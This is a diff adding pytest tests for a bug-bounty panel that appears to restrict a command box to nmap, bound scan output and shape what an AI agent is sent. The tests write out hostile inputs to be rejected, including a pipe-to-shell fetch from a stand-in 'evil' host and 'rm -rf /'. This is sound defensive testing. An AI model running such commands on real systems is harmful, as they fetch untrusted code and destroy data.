@@ -2304,7 +2304,8 @@ class FakeBugBountyAgent:
 
     def build_messages(self, target, program, scope_type, findings, nmap_output):
         self.calls.append((target, program, scope_type, findings, nmap_output))
-        return [{"role": "user", "content": target}]
+        # Shaped like the real agent: the request carries far more than the target.
+        return [{"role": "user", "content": "\n".join(filter(None, [target, findings, nmap_output]))}]
 
 
 REPORT = (
@@ -2458,6 +2459,92 @@ class TestBugSprayPanel:
         spray.target_input.clear()
         spray.run_nmap()
         assert [c for c in spray.host.calls if c[0] == "authorize"] == []
+
+    # ── nmap runner bounds ─────────────────────────────────────────────
+
+    def test_only_nmap_can_be_run_from_the_command_box(self, spray, monkeypatch):
+        from ui.panels.bug_bounty import BugBountyPanel
+        monkeypatch.setattr("ui.panels.bug_bounty.shutil.which", lambda name: "/usr/bin/nmap")
+        assert BugBountyPanel._nmap_argv("nmap -sV --open 10.0.0.1") == (
+            "/usr/bin/nmap", ["-sV", "--open", "10.0.0.1"])
+        assert BugBountyPanel._nmap_argv("/opt/homebrew/bin/nmap -p 80 'host name'")[1] == ["-p", "80", "host name"]
+        for bad in ("curl http://evil/x | sh", "rm -rf /", "bash -c nmap", "nmapx 10.0.0.1"):
+            with pytest.raises(ValueError):
+                BugBountyPanel._nmap_argv(bad)
+        spray.nmap_cmd_input.setText("curl http://evil/x")
+        spray.run_nmap()
+        assert spray._nmap_process is None
+        assert "Only nmap" in spray.nmap_output.toPlainText()
+
+    def test_missing_nmap_is_reported_before_any_process(self, spray, monkeypatch):
+        monkeypatch.setattr("ui.panels.bug_bounty.shutil.which", lambda name: None)
+        monkeypatch.setattr("ui.panels.bug_bounty.Path.is_file", lambda self: False)
+        spray.nmap_cmd_input.setText("nmap -sV 10.0.0.1")
+        spray.run_nmap()
+        assert spray._nmap_process is None
+        assert "not installed" in spray.nmap_output.toPlainText()
+        assert spray.nmap_run_btn.isEnabled() is True
+
+    def test_a_start_failure_releases_the_buttons(self, spray):
+        from PySide6.QtCore import QProcess
+        spray.set_busy(spray.nmap_run_btn, spray.nmap_stop_btn, True)
+        spray._nmap_error(QProcess.FailedToStart)
+        assert spray.nmap_run_btn.isEnabled() is True
+        assert "could not be started" in spray.nmap_output.toPlainText()
+
+    def test_scan_output_is_capped_and_the_scan_killed(self, spray):
+        import ui.panels.bug_bounty as mod
+        class Proc:
+            def __init__(self, chunk):
+                self.chunk, self.killed = chunk, False
+            def readAll(self):
+                class B:
+                    def __init__(s, d): s.d = d
+                    def data(s): return s.d
+                return B(self.chunk)
+            def kill(self):
+                self.killed = True
+        spray._nmap_scan_text = ""
+        spray._nmap_truncated = False
+        proc = Proc(b"x" * (mod.NMAP_OUTPUT_LIMIT + 100))
+        spray._nmap_process = proc
+        spray._nmap_read()
+        assert len(spray.nmap_scan_text) == mod.NMAP_OUTPUT_LIMIT
+        assert proc.killed is True
+        assert "capped" in spray.nmap_output.toPlainText()
+
+    def test_the_model_sees_scanner_output_not_the_panel_markers(self, spray):
+        spray.nmap_output.setPlainText("[Running] nmap -sV 10.0.0.1\n")
+        spray._nmap_scan_text = "22/tcp open ssh OpenSSH 9.6\n"
+        spray.nmap_output.insertPlainText(spray._nmap_scan_text + "\n[Done]")
+        spray.analyse()
+        nmap_arg = spray.host.agent_instances["bug_bounty"].calls[-1][4]
+        assert nmap_arg == "22/tcp open ssh OpenSSH 9.6"
+        assert "[Running]" not in nmap_arg and "[Done]" not in nmap_arg
+
+    def test_authorisation_prices_the_whole_request(self, spray):
+        spray.findings_input.setPlainText("GET /search?q=<script> ... " * 40)
+        spray.analyse()
+        auth = [c for c in spray.host.calls if c[0] == "authorize"][-1]
+        assert len(auth[4]) > 1000                      # the full prompt text
+        assert auth[6] == spray.target_input.text()     # the label stays the target
+
+    def test_shutdown_kills_a_running_scan(self, spray):
+        from PySide6.QtCore import QProcess
+        class Proc:
+            def __init__(self):
+                self.killed, self.waited = False, False
+            def state(self):
+                return QProcess.Running
+            def kill(self):
+                self.killed = True
+            def waitForFinished(self, _ms):
+                self.waited = True
+                return True
+        proc = Proc()
+        spray._nmap_process = proc
+        spray.shutdown()
+        assert proc.killed and proc.waited
 
 
 # ─────────────────────────────────────────────────────────────────────────────
